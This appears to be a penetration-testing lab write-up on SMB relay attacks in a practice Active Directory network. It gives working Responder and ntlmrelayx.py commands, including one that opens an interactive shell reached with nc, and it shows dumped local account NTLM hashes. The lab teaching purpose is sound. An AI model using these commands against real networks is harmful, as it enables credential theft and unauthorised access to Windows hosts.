**SMB Relay Attacks**

Instead of cracking hashes, we can relay those hashes to other machines and potentially gain access.

<img width="720" height="205" alt="image" src="https://github.com/user-attachments/assets/56dd2a5c-f8d8-44be-b8f6-f21d7cfdafbc" />

SMB relay only works if SMB signing is disabled on the target.

Lets run a NMAP script on DC

nmap --script=smb2-security-mode.nse -p445 192.168.1.100 -Pn

<img width="662" height="275" alt="image" src="https://github.com/user-attachments/assets/e9cb045b-606c-4989-a788-8052dcc0eb2f" />

Here SMB signing is enabled and required, so we cannot perform our attack on Domain Controller

Lets try on Punisher machine

<img width="591" height="257" alt="image" src="https://github.com/user-attachments/assets/f7a84692-7110-4502-b66e-491e4cad6c8c" />

Here we have SMB signing is enabled and not required.

Lets check on Spiderman machine

<img width="627" height="326" alt="image" src="https://github.com/user-attachments/assets/152fa9b5-3367-4306-8530-c4cde9865ba9" />

Here also we have SMB signing is enabled and not required.

So we can perform the SMB relay attack on Punisher and Spiderman machine.

<img width="720" height="392" alt="image" src="https://github.com/user-attachments/assets/270a5623-cee0-40f2-9ef0-1af7bf37f081" />

So in short,

If SMB signing is enabled and required >> secure, no relay possible

If SMB signing is enabled and not required >> vulnerable, relay possible

Now, we will create a file where we will keep the IP address of target nachines (Punisher and Spiderman)

<img width="720" height="117" alt="image" src="https://github.com/user-attachments/assets/1f66f32b-7fae-45c7-837e-6703467b50bd" />

Now we have to change Responder configuration file

***gedit /etc/responder/Responder.conf***

<img width="720" height="481" alt="image" src="https://github.com/user-attachments/assets/091c03dd-9640-4c2c-adbe-927b2c2883d0" />

We have to switch OFF SMB and HTTP

Lets run the Responder

***responder -I eth0 -dwv***

<img width="661" height="567" alt="image" src="https://github.com/user-attachments/assets/30a03c98-278f-48ef-8c9c-a0b577979850" />

Responder is listening.

Now we will use **ntlmrelayx.py** tool to dump the hashes

Lets activate the env variable

***. venv/bin/activate OR source ~/venvs/impacket/bin/activate***

<img width="720" height="120" alt="image" src="https://github.com/user-attachments/assets/5ea10d06-84fe-4852-b03e-24f396ddc4e3" />

***ntlmrelayx.py -tf pparker_IP4relay.txt-smb2support --no-http --no-wcf --no-rpc --no-raw --no-winrm --no-mssql --no-rdp***

<img width="720" height="240" alt="image" src="https://github.com/user-attachments/assets/353403e0-3375-4b96-9371-57714e554d68" />

Now we need an event. DNS resolution actually. Lets login at Punisher machine

<img width="720" height="260" alt="image" src="https://github.com/user-attachments/assets/4218479b-e929-45e9-abd7-f7599c20e61c" />

And we got the hashes

<img width="720" height="460" alt="image" src="https://github.com/user-attachments/assets/0d7bf220-3e55-4228-b1e8-3f8dafe12e1b" />

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:c8f5e40a9c3c86ae325f814a14408b30:::
peterparker:1001:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
```

Now, lets understand the Attack

Lets say our Target is pparker machine. We will put pparker machine IP in a txt file relay_target.txt.

Now, we will start Responder and it will start listening.

Then we will start ntlmrelayx.py tool and wait for any other machine (other than Target) will perform any DNS resolution. In our case we have mistyped \\hackm and it will do an DNS resolution.

Now, while doing DNS resolution, it trigger some LLMNR/NBT-NS broadcast. The Responder answers that broadcast, captures the live authentication, and ntlmrelayx immediately forwards it to pparker.

Important point to note that, the machine who is resolving DNS must have admin rights on target machine (pparker). In our case fcastle should have admin rights on pparker.

Now, lets try to reverse the attack. This time our target will be fcastle. We have put the IP address of fcastle in a text file.

***ntlmrelayx.py -tf fcastle_IP4relay.txt-smb2support --no-http --no-wcf --no-rpc --no-raw --no-winrm --no-mssql --no-rdp***

<img width="720" height="231" alt="image" src="https://github.com/user-attachments/assets/04e8a58c-de99-489f-a116-14f556c8ea4f" />

Responder is still running.

Lets try to resolve DNS in SPIDERMAN machine

On SPIDERMAN machine

<img width="720" height="229" alt="image" src="https://github.com/user-attachments/assets/739e312f-d9a2-4e51-ba5d-6b80c4a0a8f0" />

<img width="720" height="369" alt="image" src="https://github.com/user-attachments/assets/a77a83a8-b932-46f0-882f-0531676c0ab7" />

This time the attack didnot worked.

We got Error code: 0x5 access_denied

It means pparker is not a member of the local Administrators group on fcastle.

Now, we can get an interactive shell with -i option

***ntlmrelayx.py -tf fcastle_IP4relay.txt-smb2support --no-http --no-wcf --no-rpc --no-raw --no-winrm --no-mssql --no-rdp -i***

<img width="720" height="387" alt="image" src="https://github.com/user-attachments/assets/3dd7edd1-d67d-4688-94cc-a1ec95a9bb38" />

On client shell is opened on 127.0.0.1:11000

Let check

nc 127.0.0.1 11000

<img width="720" height="381" alt="image" src="https://github.com/user-attachments/assets/810f26f1-77d9-4951-b0e0-0ff898c63caa" />




